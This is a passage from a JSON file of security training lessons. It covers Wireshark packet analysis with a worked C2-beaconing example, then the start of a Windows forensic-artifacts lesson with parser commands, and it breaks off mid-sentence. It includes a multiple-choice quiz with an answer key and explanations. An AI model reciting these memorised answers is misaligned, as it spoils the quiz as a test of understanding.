      "content": "Open a capture in Wireshark and the window is divided into **three panes**, each a different zoom level on the same data. Learning what they show is the foundation of packet analysis.\n\n### 1. The packet list (top)\n\nA scrolling table with one row per packet. Its columns summarise each packet at a glance:\n\n- **No.** — the packet's number in the capture.\n- **Time** — when it was captured (relative to the start).\n- **Source** and **Destination** — the IP addresses talking.\n- **Protocol** — the highest-level protocol Wireshark recognised (HTTP, DNS, TCP, TLS…).\n- **Length** — the packet's size in bytes.\n- **Info** — a plain-language summary of what the packet is doing.\n\nA few rows from a real packet list look like this once you strip it down to plain text:\n\n```\nNo.   Time      Source        Destination     Protocol  Length  Info\n1     0.000000  10.10.5.22    8.8.8.8         DNS       74      Standard query A example.com\n2     0.014221  8.8.8.8       10.10.5.22      DNS       90      Standard query response A 93.184.216.34\n3     0.015900  10.10.5.22    93.184.216.34   TCP       66      54120 -> 443 [SYN]\n4     0.041300  93.184.216.34 10.10.5.22      TCP       66      443 -> 54120 [SYN, ACK]\n5     0.041450  10.10.5.22    93.184.216.34   TCP       60      54120 -> 443 [ACK]\n```\n\nThat five-row snippet already tells a story: the workstation looked up a domain name (rows 1-2), then opened a TCP connection to the IP it received (rows 3-5), completing the classic **three-way handshake** — SYN, SYN-ACK, ACK — that starts every TCP conversation. This is where you skim for the interesting traffic, and Wireshark also **colour-codes** rows by type, so anomalies and errors stand out.\n\n### 2. The packet details (middle)\n\nClick one packet and this pane expands it into its **layers**, which you can unfold like nested folders. This reflects how networking really works: each packet is wrapped in layers, from the physical frame up to the application data:\n\n- **Frame / Ethernet** — the lowest layer, with hardware (MAC) addresses.\n- **IP** — the source and destination IP addresses (which machines).\n- **TCP or UDP** — the ports (which service) and, for TCP, connection flags.\n- **Application** — the actual content: the HTTP request, the DNS query, the TLS handshake.\n\nReading these layers top-to-bottom answers *who* (IP), *what service* (port/protocol), and *what was said* (application data) for that one packet.\n\n### 3. The packet bytes (bottom)\n\nThe raw packet in hexadecimal and ASCII — the actual bytes on the wire. Beginners rarely need this, but it is where you can see raw content, including, alarmingly, plaintext data in unencrypted protocols.\n\nThe mental model to build: the **list** is your index, the **details** decode one packet into its layers, and the **bytes** are the ground truth underneath. Most analysis lives in the list and details panes — skim the list to find candidates, then drill into details to understand exactly what a packet is."
    },
    {
      "heading": "Filtering: Finding the Needle in Millions of Packets",
      "content": "A few minutes of network traffic can be *millions* of packets. Nobody reads them all — the essential skill is **filtering**, telling Wireshark to show only the packets you care about. There are two kinds of filter, and confusing them is a classic beginner mistake.\n\n**Capture filters** decide which packets are *recorded in the first place*. They are set before capturing and use a syntax called BPF (for example `host 10.0.0.5` to record only traffic to/from that IP). Because they discard everything else permanently, they are used to keep captures small — but you can never get back what you did not capture.\n\n**Display filters** decide which of the *already-captured* packets are *shown*. They do not delete anything; they just hide the noise so you can focus, and you change them freely as your investigation moves. This is the filter you will use constantly, typed into the bar at the top of Wireshark. Its syntax is different from capture filters and worth learning, because a handful of expressions cover most work:\n\n```\nip.addr == 10.0.0.5                        packets to or from that IP\ntcp.port == 443                            traffic on port 443 (HTTPS)\nhttp                                       only HTTP packets\ndns                                        only DNS packets\ntls                                        only TLS/HTTPS handshake and records\nip.src == 10.0.0.5 && dns                  combine with && (and), || (or), ! (not)\ntcp.flags.syn == 1 && tcp.flags.ack == 0   connection-opening SYN packets (scan hunting)\n```\n\nThe workflow is to start broad and narrow down. See something odd from one IP? Filter to `ip.addr == <that IP>` to isolate its whole conversation. Suspect DNS abuse? Filter to `dns` and scan the queries. Each filter strips away the irrelevant, so the meaningful traffic rises to the top.\n\nThe key distinction to remember: **capture filters limit what you keep; display filters limit what you see.** For analysis in the SOC, you are almost always working with display filters on a capture someone already collected — so mastering the display-filter bar is the single most practical Wireshark skill a beginner can build."
    },
    {
      "heading": "Following the Conversation and Reading Statistics",
      "content": "Individual packets are pieces of a larger conversation. Two Wireshark features let you step back and see the whole exchange rather than one packet at a time.\n\n### Follow the stream\n\nRight-click a TCP packet and choose **Follow > TCP Stream**, and Wireshark reassembles every packet of that conversation into a single, readable view — showing the full back-and-forth between the two machines in order, with each side colour-coded. This is enormously powerful: instead of piecing together a request and response from scattered packets, you see the entire dialogue at once. For unencrypted protocols, this can reveal a complete HTTP request and the server's reply, the commands sent over a plaintext session, or — a serious finding — **credentials sent in the clear**. (For encrypted traffic like TLS/HTTPS, the stream shows scrambled content, so you rely on metadata: who talked to whom, when, and how much.)\n\n### The Statistics menu\n\nRather than reading packets, sometimes you want the shape of the traffic. Wireshark's **Statistics** menu summarises a capture in ways that surface anomalies fast:\n\n- **Protocol Hierarchy** — what protocols make up the capture and in what proportion. An unexpected protocol, or a surprising amount of one, is a lead.\n- **Conversations** — every pair of machines that talked, with packet and byte counts. This instantly shows *who talked to whom the most* — a single internal host exchanging a large volume with an unfamiliar external IP jumps out here.\n- **Endpoints** — every individual address seen, so you can spot an unexpected participant.\n\nThese views turn a capture into a summary you can reason about. A common investigation move: open **Conversations**, sort by bytes, and notice one internal machine sending an unusually large amount of data to an external address — then filter to that conversation and **Follow the stream** to see what it was.\n\nThe pattern to internalise is **zoom out, then zoom in**. Statistics and Conversations give you the big picture and point at the suspicious pair; Follow-Stream and the details pane let you drill into exactly what that pair was doing. Beginners who learn this rhythm — summarise, spot the outlier, isolate it, read it — can get real answers out of a capture without drowning in individual packets. The next section walks that exact rhythm through a full, worked example."
    },
    {
      "heading": "Worked Example: From Alert to Verdict in a Capture",
      "content": "Suppose an EDR alert flags workstation `10.10.5.22` as behaving oddly, and a colleague hands you a one-hour PCAP covering that machine. Here is the zoom-out-then-zoom-in rhythm from the previous section, applied step by step.\n\n### Step 1 — Zoom out with Statistics > Conversations\n\nSorted by total bytes, the Conversations tab shows:\n\n```\nIPv4 Conversations                              Duration   Bytes A->B   Bytes B->A\n10.10.5.22 <-> 203.0.113.77                      00:42:18      812 KB       1.1 MB\n10.10.5.22 <-> 151.101.65.69 (known CDN)         00:03:02       45 KB       620 KB\n10.10.5.22 <-> 10.10.5.1 (gateway/DNS)           00:44:00        9 KB         6 KB\n```\n\nThe top row is the outlier: a sustained 42-minute conversation exchanging almost 2 MB with an IP that is not a recognisable service, compared to a brief, ordinary-looking CDN request and routine DNS chatter with the local gateway.\n\n### Step 2 — Zoom in with a display filter\n\nIsolate that one conversation:\n\n```\nip.addr == 203.0.113.77\n```\n\n### Step 3 — Read the isolated packet list\n\n```\nNo.   Time       Source        Destination      Protocol  Length  Info\n4021  00:00:00   10.10.5.22    203.0.113.77     TCP       66      54221 -> 443 [SYN]\n4022  00:00:00   203.0.113.77  10.10.5.22       TCP       66      443 -> 54221 [SYN, ACK]\n4023  00:00:00   10.10.5.22    203.0.113.77     TLS       583     Client Hello\n5104  00:00:30   10.10.5.22    203.0.113.77     TLS       210     Application Data\n6188  00:01:00   10.10.5.22    203.0.113.77     TLS       210     Application Data\n7266  00:01:30   10.10.5.22    203.0.113.77     TLS       210     Application Data\n```\n\n### Step 4 — Interpret what you see\n\nThe connection is TLS-encrypted, so **Follow TCP Stream** would only show scrambled bytes — you cannot read the payload. But you do not need to: the traffic is **Application Data** packets of an almost identical 210-byte length, arriving every 30 seconds like clockwork, for 42 minutes straight. Real human browsing over TLS produces bursts of varied-size packets as pages load and a person reads them; this is instead a flat, metronomic rhythm with no human variability at all — the classic shape of **C2 beaconing** (covered in detail in the next section), spotted entirely from metadata even though the content itself is encrypted.\n\n### Step 5 — Decide the next move\n\nThe capture alone gives you strong behavioural evidence but not certainty, so the next step is enrichment, not a final verdict: pivot `203.0.113.77` through the tools from the enrichment lesson — check it on VirusTotal, WHOIS, passive DNS, and a reputation feed — to see whether independent sources corroborate what the traffic pattern already suggests. This is exactly how a SOC investigation actually flows: the capture tells you *how the host behaved*, enrichment tells you *what the destination is*, and together they produce a confident verdict."
    },
    {
      "heading": "What a SOC Analyst Hunts for in a Capture",
      "content": "Knowing the tool is only half the job; the other half is knowing *what suspicious traffic looks like*. A handful of patterns come up again and again, and each has a recognisable shape in a capture.\n\n### Command-and-control (C2) beaconing\n\nMalware that has infected a machine \"phones home\" to its operator on a schedule. In a capture this shows up as a machine making **small, regular, repeating connections** to the same external destination — every 30 seconds, every 5 minutes — with almost machine-like regularity, exactly as seen in the worked example above. Human web browsing is bursty and varied; beaconing is metronomic. Wireshark's I/O graphs and the Conversations view help you spot the rhythm.\n\n### Data exfiltration\n\nStolen data leaving the network appears as an **unusually large outbound transfer** — an internal host uploading far more than it downloads, to an external or unfamiliar destination. Sorting Conversations by bytes and watching the outbound direction is the fastest way to catch it.\n\n### Plaintext credentials and sensitive data\n\nOlder or misconfigured protocols (FTP, Telnet, plain HTTP) send data unencrypted. Following such a stream can reveal usernames, passwords, or confidential content in the clear — both a finding about the attack and a hygiene problem to report.\n\n### DNS abuse\n\nDNS should be small lookups. Attackers abuse it for **tunnelling** (smuggling data inside DNS queries) and for reaching malicious domains. Filter to `dns` and watch for oddly long, random-looking domain names, a flood of queries to one domain, or lookups of known-bad domains.\n\n### Scanning and reconnaissance\n\nAn attacker mapping the network generates **many connection attempts across many ports or hosts** — in a capture, a burst of SYN packets (`tcp.flags.syn == 1`) fanning out, often with few completed connections.\n\n### Unusual protocols or ports\n\nTraffic on ports that should not carry it, or a protocol appearing where it does not belong, is worth a look — attackers often use non-standard ports to evade simple controls.\n\nThe unifying method is the same one that runs through all of network analysis: **know what normal looks like, and hunt the deviation.** A capture is most powerful when combined with your other sources — a firewall log flags a connection, and the capture tells you it was beaconing; an EDR alert names a process, and the capture shows the data it sent. As a beginner, you do not need to catch everything at once. Start by opening a capture, filtering to one suspicious host, following its stream, and asking a single question: *does this conversation look like a human doing normal work, or like a machine doing something it should not?* That question, backed by the tools in this lesson, is the heart of network traffic analysis."
    }
  ],
  "keyTakeaways": [
    "A packet is the basic unit of network data, and a PCAP (.pcap/.pcapng) is a recorded file of packets — ground truth about what actually crossed the wire, viewed in Wireshark (GUI) or captured with tcpdump/tshark (CLI); analysts usually receive a capture from a sensor or responder and read it.",
    "Wireshark's three panes are the packet list (one row per packet: No./Time/Source/Destination/Protocol/Length/Info), the packet details (the packet unfolded into layers — Frame/Ethernet, IP, TCP/UDP, Application), and the raw bytes.",
    "Filtering is the core skill: capture filters (BPF) limit what is recorded, while display filters limit what is shown (ip.addr==, tcp.port==443, http, dns, combined with && || !) — in the SOC you mostly use display filters on a capture someone already collected.",
    "Zoom out then in: use Statistics > Conversations/Protocol Hierarchy to find the outlier pair, then Follow > TCP Stream or the packet list to read the whole conversation — as the worked example showed, even encrypted TLS traffic reveals beaconing through metadata alone (fixed-size packets at a fixed interval).",
    "Hunt for C2 beaconing (small regular repeats), large outbound exfil, plaintext credentials, DNS tunnelling, and scan bursts, always by comparing against normal — and treat a capture's behavioural evidence as a lead to enrich (VirusTotal/WHOIS/passive DNS), not a final verdict by itself."
  ],
  "quiz": [
    {
      "question": "You are analysing a packet capture and want to see only the traffic to and from the host 10.0.0.5 that is already recorded in the file, without deleting any other packets. Which type of filter do you use, and why?",
      "options": [
        {
          "label": "A capture filter, because capture filters are applied after recording to temporarily hide packets you do not currently want to look at in the file.",
          "value": "a"
        },
        {
          "label": "A display filter such as ip.addr == 10.0.0.5, because display filters hide the other already-captured packets without deleting them, and can be changed freely.",
          "value": "b"
        },
        {
          "label": "A capture filter such as host 10.0.0.5, because it is the only way to view specific traffic and it leaves all other packets fully visible in the capture.",
          "value": "c"
        },
        {
          "label": "Neither, because Wireshark cannot limit which packets are shown once a capture file has already been opened for analysis by the user.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "A display filter (e.g. ip.addr == 10.0.0.5) limits which already-captured packets are shown without deleting anything and can be changed freely as the investigation moves — the right tool for analysing an existing capture. Option a reverses the definitions: capture filters are applied before/during recording, not after. Option c is wrong because a capture filter would have discarded other packets at capture time, and here the file already exists. Option d is false because filtering shown packets is a core Wireshark feature."
    },
    {
      "question": "In a capture you notice an internal workstation making a small connection to the same external IP address every 60 seconds, very regularly, over a long period. What does this pattern most likely indicate?",
      "options": [
        {
          "label": "Normal web browsing, because a person loading web pages naturally produces small, perfectly regular connections to one address once every 60 seconds.",
          "value": "a"
        },
        {
          "label": "Command-and-control beaconing, because infected malware phones home on a schedule, producing small, metronomic, repeating connections unlike bursty human traffic.",
          "value": "b"
        },
        {
          "label": "A large data-exfiltration transfer, because stolen data always leaves the network as tiny 60-second connections rather than as a single large outbound upload.",
          "value": "c"
        },
        {
          "label": "A port scan, because scanning a network is defined by one repeated connection to a single external IP address at a steady one-minute interval.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Small, highly regular, repeating connections to the same external destination are the classic signature of C2 beaconing — malware phoning home on a schedule, which is metronomic unlike the bursty, varied pattern of human browsing. Option a is wrong because real browsing is irregular and bursty. Option c misdescribes exfiltration, which appears as a large outbound transfer, not tiny periodic beacons. Option d is wrong because scanning fans out across many ports/hosts, not one address on a steady interval."
    },
    {
      "question": "In the worked example, a host exchanges data with an external IP over TLS, so Follow TCP Stream only shows scrambled bytes. How were the analyst still able to build a case that the traffic was beaconing?",
      "options": [
        {
          "label": "By decrypting the TLS session directly in Wireshark to read the plaintext application data being exchanged every 30 seconds.",
          "value": "a"
        },
        {
          "label": "By reading the metadata: fixed-size Application Data packets recurring at a fixed 30-second interval, a rhythm ordinary browsing does not produce.",
          "value": "b"
        },
        {
          "label": "By assuming any TLS-encrypted connection to an external IP is automatically malicious regardless of its timing or size pattern.",
          "value": "c"
        },
        {
          "label": "By checking the packet bytes pane, which always displays decrypted plaintext for TLS traffic even without the session key.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Even without reading the encrypted content, the metadata visible in the packet list — near-identical packet lengths repeating at a constant interval over 42 minutes — is a strong behavioural signature of beaconing, which is exactly how the worked example reached its conclusion. Option a is wrong because no decryption occurred in the example. Option c is an unjustified overgeneralisation; encrypted traffic to an external IP is common and not inherently malicious. Option d is false — the bytes pane does not magically decrypt TLS without the session key."
    }
  ],
  "references": [
    "https://www.wireshark.org/docs/wsug_html_chunked/",
    "https://wiki.wireshark.org/DisplayFilters",
    "https://www.tcpdump.org/manpages/tcpdump.1.html"
  ],
  "xp": 225,
  "estimatedMinutes": 46,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-windows-forensic-artifacts",
  "slug": "windows-forensic-artifacts",
  "title": "Windows Forensic Artifacts: Proving What Happened on a Machine",
  "topic": "Windows Forensics",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "When you need to prove that a specific program ran on a Windows machine, or that a file existed, or which folders someone opened — even after the attacker tried to cover their tracks — you turn to forensic artifacts. These are the traces Windows leaves behind as a side effect of normal operation: little records scattered across the file system and registry that, read together, reconstruct what happened. This lesson assumes no forensics background and defines every term as it appears: what an artifact is, what the registry and NTFS are, what each major artifact (Prefetch, Amcache, Shimcache, the MFT, LNK files, Jump Lists, ShellBags, and registry execution artifacts like UserAssist and BAM/DAM) proves, how real tools parse them with actual commands and sample output, and how a SOC/DFIR analyst weaves several artifacts into one corroborated, defensible account of an intrusion — even when logs and EDR are gone or never existed.",
  "sections": [
    {
      "heading": "Start Here: What a Forensic Artifact Actually Is",
      "content": "A **forensic artifact** is a trace that Windows creates automatically as it runs — not a security log someone chose to enable, but a byproduct of the operating system doing its job. Windows constantly records small facts to make itself faster and more convenient: which programs you have run (so it can pre-load them), which files you opened recently (so it can show them in a jump list), which folders you browsed (so it remembers your view settings). Each of these conveniences leaves a durable record, and those records are gold for an investigator.\n\n### A quick analogy\n\nThink of a hotel. The front-desk log shows who checked in and checked out — that is like a security event log, deliberately kept for record-keeping. But the hotel also leaves traces nobody 'chose' to record: the minibar was restocked (someone was in the room), a keycard opened a side door at 2 AM (someone was moving), the parking gate camera caught a plate at a certain time. None of these exist for security purposes — they are side effects of the hotel simply running — yet together they can prove exactly who was where and when, even if the front-desk log page went missing. Windows artifacts are the digital equivalent of those side-effect traces.\n\n### Two terms you will need for the rest of this lesson\n\n- **The registry** — Windows' central configuration database, organised into files called **hives** (e.g. `SYSTEM`, `SOFTWARE`, and each user's `NTUSER.DAT`). Several of the artifacts below (Amcache, Shimcache, ShellBags, UserAssist, BAM/DAM) live inside these hives, not as plain files you can open in Notepad — they need a parser, which this lesson will show you using.\n- **NTFS** — the file system most Windows drives use. It keeps a master index of every file (the **MFT**, covered in detail below) and is the reason Windows can track file timestamps as precisely as it does.\n\n### Why do these matter so much when we already have event logs and EDR?\n\nThree reasons:\n\n- **They survive when other evidence does not.** An attacker may clear the Security event log or operate on a machine with no EDR agent. But forensic artifacts are numerous, scattered, and often unknown to the attacker, so they frequently remain even after deliberate log-clearing.\n- **They prove things logs may not capture.** Without specific auditing enabled, Windows may not log that a particular program executed — but the **Prefetch** artifact records it anyway. Artifacts fill the gaps in your logging coverage.\n- **They defeat anti-forensics.** Attackers try to hide, but they rarely know *every* place Windows recorded them. An artifact they forgot to wipe can expose the whole operation.\n\nArtifacts answer specific investigative questions, and it helps to think of them by the question they answer:\n\n- *Did this program run?* → execution artifacts (Prefetch, Amcache, Shimcache, and registry execution traces like UserAssist and BAM/DAM).\n- *Did this file exist, and when?* → the file system's Master File Table (MFT).\n- *What files did the user open?* → LNK files and Jump Lists.\n- *Which folders did they browse?* → ShellBags.\n\nThe reason artifacts are so powerful in combination is that no single one tells the whole story, but together they corroborate each other: Prefetch says a tool ran, the MFT shows when its file appeared, a LNK file shows the user opened a document, ShellBags show they browsed to a sensitive folder. This lesson walks through the key artifacts by category, then shows the real tools that parse them, so you know exactly what each proves — and, just as importantly, what it does *not* prove."
    },
    {
      "heading": "Execution Artifacts — Proving a Program Ran",
      "content": "The most-asked forensic question is \"did this program execute on the machine?\" Windows keeps several records that help answer it, each with different strengths and an important catch about what it really proves.\n\n### Prefetch\n\nTo make applications launch faster, Windows creates a small file in `C:\\Windows\\Prefetch\\` for programs that run — named like `PROGRAM.EXE-XXXXXXXX.pf`. This artifact is strong **evidence of execution**: it typically records the program's name, **how many times it has run**, and the **last run time(s)** (recent Windows versions keep the last several run times). If you see `MIMIKATZ.EXE-...pf`, that tool ran on this machine. (Note: Prefetch is enabled by default on Windows workstations but often disabled on servers.)\n\nParsed with a tool (shown fully later in this lesson), a Prefetch file might read like this:\n\n```\nExecutable name: MIMIKATZ.EXE\nRun count: 3\nLast run: 2026-08-14 09:41:02 UTC\nOther run times: 2026-08-13 22:05:11 UTC, 2026-08-12 18:12:47 UTC\nVolume: C:\nDirectory referenced: \\WINDOWS\\SYSTEM32\n```\n\nRead as a sentence: this executable ran three times, most recently at 09:41 UTC on 14 August — a timestamp you can now anchor other evidence around.\n\n### Amcache\n\nThe `Amcache.hve` registry hive records information about programs that have been present and run, including **file paths and SHA-1 hashes** and timestamps. The hash is especially useful — it lets you tie an executed file to threat intelligence even if the file itself is gone.\n\n### Shimcache (AppCompatCache)\n\nStored in the SYSTEM registry hive, Shimcache tracks executables the system encountered, recording the **file path, size, and last-modified time**. A crucial subtlety: Shimcache indicates a program was *present/registered* by the compatibility system, which does **not** by itself guarantee it was executed. Treat it as evidence of presence and a timeline data point, corroborated by other artifacts.\n\n### Registry execution traces: UserAssist and BAM/DAM\n\nTwo more registry-based artifacts are worth knowing because they capture execution from a different angle:\n\n- **UserAssist** — stored under `NTUSER.DAT`, this records programs launched **from the GUI** (double-clicked from Explorer or the Start menu), along with a run count and last-run time. Its values are obfuscated with a simple ROT13 cipher, which any modern parser reverses automatically.\n- **BAM / DAM (Background/Desktop Activity Moderator)** — a SYSTEM-hive artifact that Windows uses to manage background app activity, and as a side effect it records the **full path and a last-execution timestamp** for programs that ran, per user SID. It is a comparatively recent addition (Windows 10+) but has become a favourite corroborating source because it is easy to parse and often survives when other traces are cleaned up.\n\nThe key discipline with execution artifacts is knowing **exactly what each proves**:\n\n| Artifact | Proves | Bonus data |\n|----------|--------|-----------|\n| Prefetch | Execution (strong) | Run count, last run times |\n| Amcache | Presence/execution | SHA-1 hash, path, time |\n| Shimcache | Presence (not guaranteed execution) | Path, size, modified time |\n| UserAssist | GUI-launched execution | Run count, last run time |\n| BAM/DAM | Execution, per user | Full path, last-execution time |\n\nBecause each has caveats, analysts **correlate** them. Prefetch plus an Amcache entry with a known-malicious hash plus a matching BAM/DAM timestamp is a far stronger case than any one alone. And when an attacker deletes their tool, these artifacts can still prove it was there and ran — which is exactly why execution artifacts are the first place a responder looks to establish what the intruder actually did."
    },
    {
      "heading": "File System Artifacts — The MFT, MACB Timestamps, and Deleted Files",
      "content": "Execution artifacts tell you a program ran; file system artifacts tell you a *file* existed, when, and what happened to it — including files an attacker has since deleted.\n\n### The Master File Table (MFT)\n\nOn an NTFS file system, the **`$MFT`** is a master index containing a record for **every file and folder** on the volume — its name, size, location, and timestamps. This makes the MFT foundational for two reasons. First, it can reveal files that were **deleted**, because their records often persist until overwritten. Second, it is the backbone of timeline analysis (covered in its own lesson), because each entry carries timestamps.\n\n### The MACB timestamps\n\nThose timestamps are often abbreviated **MACB**:\n\n- **M — Modified**: when the file's *content* last changed.\n- **A — Accessed**: when it was last read/accessed (access-time updates are sometimes disabled for performance, so treat this one as less reliable).\n- **C — Changed**: when the file's **MFT record** (metadata) last changed — distinct from content modification.\n- **B — Born (Created)**: when the file was created on the volume.\n\nReading these together tells a rich story: a file *created* at one time but with a *modified* time earlier than its creation is suspicious (it likely arrived already-built, or was copied); a tool whose *created* time matches the moment of intrusion places it squarely in the attack.\n\n### Two places store the times — and why that matters\n\nNTFS keeps timestamps in two separate structures — **`$STANDARD_INFORMATION`** (the ones most tools and users see, and that ordinary programs can change) and **`$FILE_NAME`** (harder for normal software to alter). This duplication is a gift to investigators: comparing the two can expose **timestomping** — an anti-forensic trick where an attacker backdates a file's `$STANDARD_INFORMATION` timestamps to blend in with old system files. Most timestomping tools do not bother with (or cannot easily reach) `$FILE_NAME`, so when the two disagree — say, `$STANDARD_INFORMATION` claims 2019 but `$FILE_NAME` says last Tuesday — that mismatch is a strong, specific signal of tampering.\n\n### A worked example of reading the MFT\n\nA parsed MFT record for a suspicious file might look like this (fields abbreviated for readability):\n\n```\nEntry: 84213   InUse: True   IsDirectory: False\nFileName: evil.ps1\nParentPath: C:\\Users\\Public\\\n\n$STANDARD_INFORMATION:\n  Created:  2019-03-11 10:02:00 UTC\n  Modified: 2019-03-11 10:02:00 UTC\n\n$FILE_NAME:\n  Created:  2026-08-14 14:05:02 UTC\n  Modified: 2026-08-14 14:05:02 UTC\n```\n\nThe `$STANDARD_INFORMATION` block claims the file is over six years old; the `$FILE_NAME` block — the one attackers usually forget — shows it actually appeared during the intrusion window. That contradiction is the tell.\n\n### The takeaway\n\nThe MFT is not just \"a list of files\" — it is a timestamped ledger that can (a) recover evidence of deleted files, (b) anchor a timeline, and (c) expose an attacker's attempt to hide by comparing its two internal timestamp structures. Every other artifact in this lesson gets more powerful when you can line it up against what the MFT shows."
    },
    {
      "heading": "User Activity Artifacts — LNK Files, Jump Lists, ShellBags, and Recent Documents",
      "content": "Beyond execution and file existence, investigators need to know what a *person* did: which files they opened, and which folders they explored to find them. A family of user-activity artifacts answers this.\n\n### LNK files (shortcuts)\n\nWindows creates `.lnk` shortcut files when a user opens documents, and these are rich: a LNK records the **target file's path**, its **timestamps**, and volume/serial-number information — even if the original file or the removable drive it lived on is long gone. A LNK pointing at `E:\\stolen_data.xlsx` is evidence the user opened that file from a drive `E:`, whether or not that drive is still plugged in.\n\n### Jump Lists\n\nThe recently-accessed items you see when right-clicking an app on the taskbar are stored as **Jump List** artifacts, recording which files a user opened with which application — another view of user file access, and one that is organised per application (so you can ask \"what did this person open with Word?\" specifically).\n\n### RecentDocs (registry)\n\nA registry key under the user's `NTUSER.DAT` hive, **RecentDocs**, tracks recently opened files, both overall and broken out **per file extension** (a subkey for `.xlsx`, one for `.pdf`, and so on). It is a lighter-weight cousin of LNK/Jump List evidence, useful when those are missing or when you want a quick per-extension view of what a user has been opening.\n\n### ShellBags\n\nAlso stored in the registry, **ShellBags** record folders the user **browsed in Explorer**, including their view settings (icon size, sort order — genuinely just Windows remembering your preferences). Their forensic value is proving that a user navigated to a specific folder — even a folder on a network share or removable device that no longer exists. If an insider claims they never opened a sensitive folder, ShellBags may say otherwise.\n\n### USB device history (registry)\n\nA closely related question — \"was a removable drive plugged into this machine, and when?\" — is answered by registry keys such as `USBSTOR` (under `SYSTEM`) and `MountedDevices`, which record the make/model/serial number of USB storage devices and their first/last-connected times. This is the classic corroboration for a LNK file pointing at a drive letter that no longer exists: the USB history proves *which* physical device that drive letter was, and when it was attached.\n\n### Reading this family together\n\nEach of these artifacts answers a slightly different slice of \"what did the user do\":\n\n| Artifact | Answers |\n|----------|---------|\n| LNK files | Which specific file was opened, from where (including removed drives) |\n| Jump Lists | Recent files, organised per application |\n| RecentDocs | Recent files, organised per file extension |\n| ShellBags | Which folders were browsed in Explorer |\n| USBSTOR / MountedDevices | Which removable devices were connected, and when |\n\nCombined with the execution artifacts from the previous section, you can narrate not just *what ran* but *what a person touched* and *where they went to find it* — the difference between knowing malware executed and understanding the human actions around it. An insider-threat case, in particular, often lives entirely in this family: no malware runs at all, just a person browsing to (ShellBags), opening (LNK/Jump Lists/RecentDocs), and copying to a USB drive (USBSTOR) something they should not have touched."
    },
    {
      "heading": "Parsing Artifacts With Real Tools: A Worked Example",
      "content": "Analysts rarely read raw registry hives and the `$MFT` by hand — the formats are binary and fiddly. In practice, a small, well-known toolkit does the parsing. Knowing the tool names and basic usage is part of being able to actually apply everything above.\n\n### The toolkit\n\nThe most widely used free toolkit for this work is a set of command-line utilities written by **Eric Zimmerman**, each dedicated to one artifact, plus a collection framework called **KAPE** that gathers the right files from a live or imaged machine in one pass. The tools you will meet most often:\n\n| Tool | Parses |\n|------|--------|\n| `KAPE` | Collects the target artifact files/hives themselves (Prefetch folder, registry hives, `$MFT`, etc.) from a machine or image |\n| `PECmd` | Prefetch (`.pf`) files |\n| `AmcacheParser` | `Amcache.hve` |\n| `AppCompatCacheParser` | Shimcache, from the `SYSTEM` hive |\n| `MFTECmd` | The `$MFT` |\n| `LECmd` | LNK (shortcut) files |\n| `JLECmd` | Jump Lists |\n| `SBECmd` | ShellBags |\n| `RECmd` | General-purpose registry parsing (UserAssist, RecentDocs, USBSTOR, BAM/DAM, and more) |\n\n### A typical workflow, start to finish\n\n1. **Collect** the artifacts from the machine or a forensic image (live, or via KAPE targeting the relevant folders and hives):\n\n```\nC:\\KAPE> kape.exe --tsource C: --tdest E:\\collected --target RegistryHives,Prefetch,FileSystem\n```\n\n2. **Parse Prefetch** to see what ran:\n\n```\nC:\\Tools> PECmd.exe -d \"E:\\collected\\C\\Windows\\Prefetch\" --csv \"E:\\out\"\n```\n\nThis produces a CSV with one row per `.pf` file, including `SourceFilename`, `ExecutableName`, `RunCount`, and `LastRun`.\n\n3. **Parse the MFT** to see every file (including deleted ones) with MACB times:\n\n```\nC:\\Tools> MFTECmd.exe -f \"E:\\collected\\C\\$MFT\" --csv \"E:\\out\"\n```\n\n4. **Parse ShellBags** to see folders browsed:\n\n```\nC:\\Tools> SBECmd.exe -d \"E:\\collected\\C\\Users\\jsmith\\NTUSER.DAT\" --csv \"E:\\out\"\n```\n\n5. **Parse general registry artifacts** (UserAssist, USB history, RecentDocs) with a prebuilt set of RECmd 'batch' definitions:\n\n```\nC:\\Tools> RECmd.exe --bn BatchExamples\\Kroll_Batch.reb -d \"E:\\collected\\C\\Users\\jsmith\" --csv \"E:\\out\"\n```\n\n### Why the workflow matters as much as the artifacts\n\nEach of these commands produces a CSV — a simple table — that you then open, filter, and sort like any spreadsheet, or feed into the timeline tools from the next lesson. The pattern is always the same: **collect the right file or hive → run the matching parser → get a readable table → filter to the time window and users you care about.** Once you have done this a handful of times, the artifact concepts from earlier sections stop being theory and become columns you can actually filter, sort, and cite in a report."
    },
    {
      "heading": "Using Artifacts in an Investigation",
      "content": "Individual artifacts are clues; an investigation is what happens when you assemble them into a coherent, corroborated account. A few principles make that assembly reliable.\n\n### Corroborate, never rely on one artifact\n\nEvery artifact has caveats — Shimcache may not prove execution, timestamps can be stomped, Prefetch may be off on servers. The professional habit is to build each conclusion from **multiple independent artifacts** that agree. \"The tool ran\" becomes solid when Prefetch shows execution, Amcache shows the hash, BAM/DAM shows a matching timestamp, and the MFT shows when the file appeared. One artifact is a lead; three or four that agree is a finding.\n\n### Let artifacts fill your visibility gaps\n\nIn a mature environment you have EDR and rich logs, and artifacts are backup and confirmation. But on an unmanaged machine, or after an attacker cleared logs, artifacts may be your *primary* evidence. Knowing they exist changes what you can prove: even with the Security log wiped, Prefetch, Amcache, the MFT, ShellBags, and RECmd-parsed registry keys may still reconstruct the intrusion end to end.\n\n### Watch for anti-forensics\n\nSophisticated attackers try to erase or manipulate artifacts — deleting Prefetch files, clearing logs, timestomping. But covering *every* trace is hard, and the *attempt* itself is evidence. Missing Prefetch on a machine that should have it, or timestamp anomalies between `$STANDARD_INFORMATION` and `$FILE_NAME`, are signs someone tried to hide. MITRE ATT&CK tracks this as **Indicator Removal** (including timestomping), and a good analyst treats the absence of expected artifacts as suspicious rather than reassuring.\n\n### Build one narrative, not a pile of facts\n\nThe end product of an investigation is not a stack of disconnected parser outputs — it is a narrative you could defend in a report or in court: *at 14:02 the phishing attachment's LNK shows it was opened; at 14:05 Prefetch shows PowerShell executed; the MFT shows a new file appeared at 14:05:02 with a stomped $STANDARD_INFORMATION time; ShellBags show the user's account had never browsed that folder before.* Every artifact in this lesson is a sentence in that story, and your job is to line the sentences up in order — which is exactly the subject of the next lesson, timeline analysis.\n\nThe overarching mindset is that **Windows is always writing down what it does**, usually for convenience rather than security, and an investigator's craft is knowing where those notes are kept, how to parse them with real 